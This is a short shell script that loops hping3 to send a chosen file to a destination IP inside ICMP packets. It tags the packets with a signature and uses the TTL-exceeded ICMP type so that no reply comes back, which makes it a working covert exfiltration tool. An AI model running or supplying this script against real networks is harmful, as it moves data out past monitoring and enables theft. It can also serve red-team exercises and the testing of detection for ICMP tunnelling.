#$1 - destination IP
#$2 - signature
#$3 - filename
#$4 - data frame size
#$5 - icmp type
#Option -C 11 is ttl exceeded preventing a reply
#Usage: hping3 [dest ip] [signature] [tx file] [data frame size] [icmp type]
while true; do
        if hping3 $1 --icmp --sign $2 --file $3 -d $4 -u -C $5 2>&1 | grep -q --line-buffered -m 1 EOF; then
         echo "EOF Reached"
         exit
        fi
done
